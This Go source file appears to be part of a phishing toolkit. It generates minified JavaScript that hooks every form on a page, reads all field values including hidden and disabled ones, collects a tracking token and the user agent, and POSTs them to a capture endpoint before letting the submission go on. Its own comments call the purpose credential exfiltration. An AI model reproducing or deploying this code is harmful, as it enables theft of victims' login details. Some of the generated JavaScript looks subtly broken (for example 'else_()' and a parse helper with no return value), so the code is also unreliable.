// Package capture provides JavaScript code generation for form field capture and
// submission interception. The generated JavaScript runs in the target's browser
// to enumerate form fields and intercept form submissions for credential exfiltration.
package capture

import (
	"fmt"
	"strings"
)

// FieldConfig holds configuration for form field enumeration.
type FieldConfig struct {
	// IncludeDisabled controls whether disabled fields are captured.
	IncludeDisabled bool
	// IncludeHidden controls whether hidden inputs are captured.
	IncludeHidden bool
	// NameFallbacks controls whether id or index is used when name is missing.
	NameFallbacks bool
}

// InterceptConfig holds configuration for form interception.
type InterceptConfig struct {
	// CaptureEndpoint is the local API path for POSTing capture data.
	CaptureEndpoint string
	// TrackingParam is the URL query parameter name for tracking tokens.
	TrackingParam string
	// TimeoutMs is the maximum time to wait for capture POST before proceeding.
	TimeoutMs int
	// FieldConfig holds field enumeration settings.
	FieldConfig FieldConfig
}

// GenerateCaptureJS returns minified JavaScript for form capture and interception.
// Parameters:
//   - captureEndpoint: the local API path to POST capture data to (e.g., "/api/capture")
//   - trackingParam: the URL parameter name containing the tracking token (e.g., "_t")
//   - timeoutMs: max time to wait for capture POST before proceeding (default 2000)
//
// The returned JS should be wrapped in <script> tags by the caller.
func GenerateCaptureJS(captureEndpoint, trackingParam string, timeoutMs int, config FieldConfig) string {
	if captureEndpoint == "" {
		captureEndpoint = "/api/capture"
	}
	if trackingParam == "" {
		trackingParam = "_t"
	}
	if timeoutMs == 0 {
		timeoutMs = 2000
	}

	var sb strings.Builder

	sb.WriteString("(function(){")
	sb.WriteString("var cfg={")
	sb.WriteString(fmt.Sprintf("ep:'%s',tp:'%s',to:%d", captureEndpoint, trackingParam, timeoutMs))
	if config.IncludeDisabled {
		sb.WriteString(",d:true")
	}
	if config.IncludeHidden {
		sb.WriteString(",h:true")
	}
	if config.NameFallbacks {
		sb.WriteString(",f:true")
	}
	sb.WriteString("};")

	// Field enumeration function
	sb.WriteString(`function _f(f){
var o={},i=0,k,v,e;
for(var n of f.elements){
if(n.disabled&&cfg.d&&n.name){k=n.name}else if(!n.disabled&&n.name){k=n.name}else if(cfg.f&&n.id){k=n.id}else{if(cfg.f){k='__f'+i}else{k='__u'+i};i++}
if(n.type==='checkbox'){v=n.checked?'true':'false'}else if(n.type==='radio'){if(n.checked){v=n.value}else{continue}}else if(n.type==='select-multiple'){v=[];for(var s of n.selectedOptions){v.push(s.value)}v=v.join(',')}else{v=n.value}
if(!v)continue
o[k]=v}
return o};`)

	// Tracking token extraction
	sb.WriteString(`function _t(){
var u=new URLSearchParams(window.location.search),t=u.get(cfg.tp)||'';
if(!t){var p=window.location.pathname.split('/').filter(Boolean);t=p[p.length-1];if(!/^[a-f0-9-]{32,}$/.test(t)){t=''}}
return t};`)

	// Metadata collection
	sb.WriteString(`function _m(){
return{url:window.location.pathname,ua:navigator.userAgent,ts:Date.now()}};`)

	// Capture submission function
	sb.WriteString(`function _s(f){
var c=new XMLHttpRequest(),d={f:_f(f),t:_t(),m:_m()};
c.open('POST',cfg.ep,!0);
c.setRequestHeader('Content-Type','application/json');
c.send(JSON.stringify(d));
return c};`)

	// Intercept handler
	sb.WriteString(`function _i(e){
e.preventDefault();
var f=e.target,c=_s(f);
if(!c)return;
c.onreadystatechange=function(){
if(c.readyState===3)c.target.style.opacity='0.7';
if(c.readyState===4)c.target.style.opacity='1'};
setTimeout(function(){
if(f.action)f.submit()},cfg.to);
e.stopPropagation()
return!1};`)

	// Attach interceptors to all forms
	sb.WriteString(`function _a(){
var n=0;
for(var i of document.querySelectorAll('form')){if(!i.dataset.intercepted){i.dataset.intercepted='1';i.addEventListener('submit',_i,!0);n++}}
return n};`)

	// Initialize on DOM ready
	sb.WriteString(`function _(){
var r=function(f){/^-?\\d+$/.test(f)?parseInt(f,10):f};
var q=new URLSearchParams(window.location.search);
for(var k of q.keys())if(!cfg.f||!cfg.f[k])cfg[k]=r(q.get(k));_a();document.addEventListener('DOMContentLoaded',_a)}
if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',_);else_()})();`)

	return sb.String()
}

// GenerateDefaultCaptureJS returns the default capture JavaScript with sensible defaults.
func GenerateDefaultCaptureJS() string {
	config := FieldConfig{
		IncludeDisabled: true,
		IncludeHidden:   true,
		NameFallbacks:   true,
	}
	return GenerateCaptureJS("", "", 2000, config)
}

// GenerateCaptureScriptTag generates a complete <script> tag with embedded JS.
func GenerateCaptureScriptTag(captureEndpoint, trackingParam string, timeoutMs int, config FieldConfig) string {
	js := GenerateCaptureJS(captureEndpoint, trackingParam, timeoutMs, config)
	return fmt.Sprintf("<script>%s</script>", js)
}
